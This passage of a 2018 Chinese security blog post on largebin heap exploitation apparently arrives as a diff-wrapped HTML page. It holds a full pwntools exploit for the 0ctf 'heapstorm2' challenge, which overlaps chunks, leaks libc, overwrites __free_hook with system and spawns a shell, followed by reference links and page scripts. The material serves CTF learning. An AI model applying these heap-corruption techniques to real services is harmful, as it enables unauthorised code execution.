class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	cn = process(<span class="string">'./heapstorm2'</span>)</span><br><span class="line">	<span class="comment">#bin = ELF('./heapstorm2')</span></span><br><span class="line">	libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span><span class="params">(a=<span class="string">''</span>)</span>:</span></span><br><span class="line">	gdb.attach(cn,a)</span><br><span class="line">	<span class="keyword">if</span> a == <span class="string">''</span>:</span><br><span class="line">		raw_input()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">	cn.recvuntil(<span class="string">'Command'</span>)</span><br><span class="line">	cn.sendline(<span class="string">'1'</span>)</span><br><span class="line">	cn.recvuntil(<span class="string">'Size'</span>)</span><br><span class="line">	cn.sendline(str(size))</span><br><span class="line">	cn.recvuntil(<span class="string">'Allocated'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(idx,size,con)</span>:</span></span><br><span class="line">	cn.recvuntil(<span class="string">'Command'</span>)</span><br><span class="line">	cn.sendline(<span class="string">'2'</span>)</span><br><span class="line">	cn.recvuntil(<span class="string">'Index'</span>)</span><br><span class="line">	cn.sendline(str(idx))</span><br><span class="line">	cn.recvuntil(<span class="string">'Size'</span>)</span><br><span class="line">	cn.sendline(str(size))</span><br><span class="line">	cn.recvuntil(<span class="string">'Content'</span>)</span><br><span class="line">	cn.send(con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	cn.recvuntil(<span class="string">'Command'</span>)</span><br><span class="line">	cn.sendline(<span class="string">'3'</span>)</span><br><span class="line">	cn.recvuntil(<span class="string">'Index'</span>)</span><br><span class="line">	cn.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(idx)</span>:</span></span><br><span class="line">	cn.recvuntil(<span class="string">'Command'</span>)</span><br><span class="line">	cn.sendline(<span class="string">'4'</span>)</span><br><span class="line">	cn.recvuntil(<span class="string">'Index'</span>)</span><br><span class="line">	cn.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">mmap_addr = <span class="number">0x13370800</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">####### perpare</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x508</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x508</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">####### overlap</span></span><br><span class="line"></span><br><span class="line">pay = <span class="string">'\x00'</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>)</span><br><span class="line">update(<span class="number">1</span>,len(pay),pay)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">pay = <span class="string">'\x00'</span>*(<span class="number">0x18</span><span class="number">-0xc</span>)</span><br><span class="line">update(<span class="number">0</span>,len(pay),pay)</span><br><span class="line">add(<span class="number">0xd0</span><span class="number">-8</span>)<span class="comment">#1</span></span><br><span class="line"><span class="comment">#0xf0</span></span><br><span class="line">add(<span class="number">0x430</span><span class="number">-8</span>)<span class="comment">#7 overlap1 in (big)</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#0x20</span></span><br><span class="line">add(<span class="number">0x530</span><span class="number">-8</span>)<span class="comment">#1 overlap1 out</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay = <span class="string">'\x00'</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>)</span><br><span class="line">update(<span class="number">4</span>,len(pay),pay)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">pay = <span class="string">'\x00'</span>*(<span class="number">0x18</span><span class="number">-0xc</span>)</span><br><span class="line">update(<span class="number">3</span>,len(pay),pay)</span><br><span class="line">add(<span class="number">0xe0</span><span class="number">-8</span>)<span class="comment">#2</span></span><br><span class="line"><span class="comment">#0x650</span></span><br><span class="line">add(<span class="number">0x420</span><span class="number">-8</span>)<span class="comment">#4 overlap2 in</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"><span class="comment">#0x570</span></span><br><span class="line">add(<span class="number">0x530</span><span class="number">-8</span>)<span class="comment">#2 overlap2 out</span></span><br><span class="line"></span><br><span class="line"><span class="comment">####### gao shi</span></span><br><span class="line"></span><br><span class="line">pay = <span class="string">'A'</span>*<span class="number">0xd0</span> + p64(<span class="number">0</span>)+p64(<span class="number">0x421</span>)</span><br><span class="line">pay+=<span class="string">'B'</span>*<span class="number">0x410</span>+p64(<span class="number">0x420</span>)+p64(<span class="number">0x31</span>)</span><br><span class="line">update(<span class="number">2</span>,len(pay),pay)</span><br><span class="line">delete(<span class="number">4</span>)<span class="comment"># largebin 0x420</span></span><br><span class="line">add(<span class="number">0x500</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">pay = <span class="string">'A'</span>*<span class="number">0xc0</span> + p64(<span class="number">0</span>)+p64(<span class="number">0x431</span>)</span><br><span class="line">pay+=<span class="string">'B'</span>*<span class="number">0x420</span>+p64(<span class="number">0x430</span>)+p64(<span class="number">0x31</span>)</span><br><span class="line">update(<span class="number">1</span>,len(pay),pay)</span><br><span class="line">delete(<span class="number">7</span>)<span class="comment"># unsorted bin 0x430</span></span><br><span class="line"></span><br><span class="line">pay = <span class="string">'A'</span>*<span class="number">0xc0</span> + p64(<span class="number">0</span>)+p64(<span class="number">0x431</span>)</span><br><span class="line">pay+=p64(<span class="number">0xdeadbeef</span>) + p64(mmap_addr<span class="number">-0x20</span>)</span><br><span class="line">update(<span class="number">1</span>,len(pay),pay)<span class="comment">#set unsorted bk</span></span><br><span class="line"></span><br><span class="line">pay = <span class="string">'A'</span>*<span class="number">0xd0</span> + p64(<span class="number">0</span>)+p64(<span class="number">0x421</span>)</span><br><span class="line">pay+=p64(<span class="number">0xdeadbeef</span>)+p64(mmap_addr<span class="number">-0x20</span>+<span class="number">8</span>)</span><br><span class="line">pay+=p64(<span class="number">0xdeadbeef</span>)+p64(mmap_addr<span class="number">-0x20</span><span class="number">-0x18</span><span class="number">-5</span>)<span class="comment">#for fake chunk size</span></span><br><span class="line">update(<span class="number">2</span>,len(pay),pay)<span class="comment"># set largebin bk,bk_nextsize</span></span><br><span class="line"></span><br><span class="line"><span class="comment">####### fly to 0x13370800</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	add(<span class="number">0x48</span>)<span class="comment">#5</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">	error(<span class="string">"bad luck :("</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># set four random num and p chunk1 to mmap_addr</span></span><br><span class="line">pay = p64(<span class="number">0</span>)*(<span class="number">2</span>+<span class="number">2</span>)+p64(<span class="number">0x13377331</span>)+p64(<span class="number">0</span>)+p64(mmap_addr+<span class="number">0x20</span>)</span><br><span class="line">update(<span class="number">5</span>,len(pay),pay)</span><br><span class="line"></span><br><span class="line"><span class="comment">#using chunk1 to set chunk2 to leak heap addr on mmap page</span></span><br><span class="line">pay = p64(mmap_addr+<span class="number">0x20</span>) + p64(<span class="number">0x100</span>) + p64(mmap_addr<span class="number">-0x20</span>+<span class="number">3</span>) + p64(<span class="number">8</span>)</span><br><span class="line">update(<span class="number">0</span>,len(pay),pay)</span><br><span class="line">view(<span class="number">1</span>)</span><br><span class="line">cn.recvuntil(<span class="string">'Chunk[1]: '</span>)</span><br><span class="line">heap = u64(cn.recv(<span class="number">8</span>))<span class="number">-0xf0</span></span><br><span class="line">success(<span class="string">'heap: '</span>+hex(heap))</span><br><span class="line"></span><br><span class="line"><span class="comment">#using chunk1 to set chunk2 to leak libc addr on heap</span></span><br><span class="line">pay = p64(mmap_addr+<span class="number">0x20</span>) + p64(<span class="number">0x100</span>) + p64(heap+<span class="number">0x100</span>) + p64(<span class="number">8</span>)</span><br><span class="line">update(<span class="number">0</span>,len(pay),pay)</span><br><span class="line">view(<span class="number">1</span>)</span><br><span class="line">cn.recvuntil(<span class="string">'Chunk[1]: '</span>)</span><br><span class="line">libc_base = u64(cn.recv(<span class="number">8</span>))<span class="number">-0x3c4b20</span><span class="number">-88</span></span><br><span class="line">success(<span class="string">'libc_base: '</span>+hex(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#using chunk1 to set chunk2 to freehook , set chunk3 to '/bin/sh\x00'</span></span><br><span class="line">pay = p64(mmap_addr+<span class="number">0x20</span>) + p64(<span class="number">0x100</span>) + p64(libc_base+libc.sym[<span class="string">'__free_hook'</span>]) + p64(<span class="number">0x100</span>)+p64(libc_base+libc.search(<span class="string">'/bin/sh\x00'</span>).next())+p64(<span class="number">8</span>)</span><br><span class="line">update(<span class="number">0</span>,len(pay),pay)</span><br><span class="line">update(<span class="number">1</span>,<span class="number">8</span>,p64(libc_base+libc.sym[<span class="string">'system'</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment">##free /bin/sh</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a href="http://eternalsakura13.com/2018/03/21/lctf2/" target="_blank" rel="noopener">http://eternalsakura13.com/2018/03/21/lctf2/</a></li>
+<li><a href="https://blog.pwnhub.cn/2017/11/22/LCTF-2017-%E5%AE%98%E6%96%B9Writeup/#%E6%80%9D%E8%B7%AF" target="_blank" rel="noopener">https://blog.pwnhub.cn/2017/11/22/LCTF-2017-%E5%AE%98%E6%96%B9Writeup/#%E6%80%9D%E8%B7%AF</a></li>
+<li><a href="https://gist.github.com/Jackyxty/9de01a0bdfe5fb6d0b40fe066f059fa3" target="_blank" rel="noopener">https://gist.github.com/Jackyxty/9de01a0bdfe5fb6d0b40fe066f059fa3</a></li>
+</ul>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>Veritas501</li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="https://veritas501.github.io/2018/04/11/Largebin 学习/" title="Largebin 学习">https://veritas501.github.io/2018/04/11/Largebin 学习/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> unless stating additionally.</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Heap/" rel="tag"># Heap</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/03/28/两次CTF比赛总结/" rel="next" title="两次CTF比赛总结">
+                <i class="fa fa-chevron-left"></i> 两次CTF比赛总结
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/05/05/seccomp学习笔记/" rel="prev" title="seccomp学习笔记">
+                seccomp学习笔记 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/215.png"
+                alt="Veritas501" />
+            
+              <p class="site-author-name" itemprop="name">Veritas501</p>
+              <p class="site-description motion-element" itemprop="description">开始踏上Re&Pwn之路...</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">62</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">37</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/veritas501" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="http://music.163.com/#/user/home?id=58295006" target="_blank" title="网易云"><i class="fa fa-fw fa-music"></i>网易云</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://www.zhihu.com/people/xu-qt/activities" target="_blank" title="知乎"><i class="fa fa-fw fa-quora"></i>知乎</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://osu.ppy.sh/users/9533614" target="_blank" title="OSU"><i class="fa fa-fw fa-headphones"></i>OSU</a>
+                  
+                </span>
+              
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#LCTF-2ez4u"><span class="nav-number">1.</span> <span class="nav-text">LCTF - 2ez4u</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0ctf-heapstorm2"><span class="nav-number">2.</span> <span class="nav-text">0ctf - heapstorm2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">3.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Veritas501</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Gemini</a> v6.3.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  
+  
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(function (item) {
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: '5lMbuXdt5hbFRNKM5uaAC1xm-gzGzoHsz',
+        appKey: 'vA8ML592eyDDRr5tl4J9Eco3',
+        placeholder: '说点什么...',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("97qzbH6lJuabRg1KDY7DtJRS-gzGzoHsz", "GS8vVhMCaeXncQF8mQOIShBj");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            
+            counter.save(null, {
+              success: function(counter) {
+                
+                  var $element = $(document.getElementById(url));
+                  $element.find('.leancloud-visitors-count').text(counter.get('time'));
+                
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            
+              var newcounter = new Counter();
+              /* Set ACL */
+              var acl = new AV.ACL();
+              acl.setPublicReadAccess(true);
+              acl.setPublicWriteAccess(true);
+              newcounter.setACL(acl);
+              /* End Set ACL */
+              newcounter.set("title", title);
+              newcounter.set("url", url);
+              newcounter.set("time", 1);
+              newcounter.save(null, {
+                success: function(newcounter) {
+                  var $element = $(document.getElementById(url));
+                  $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+                },
+                error: function(newcounter, error) {
+                  console.log('Failed to create');
+                }
+              });
+            
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+  
+
+  
+
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
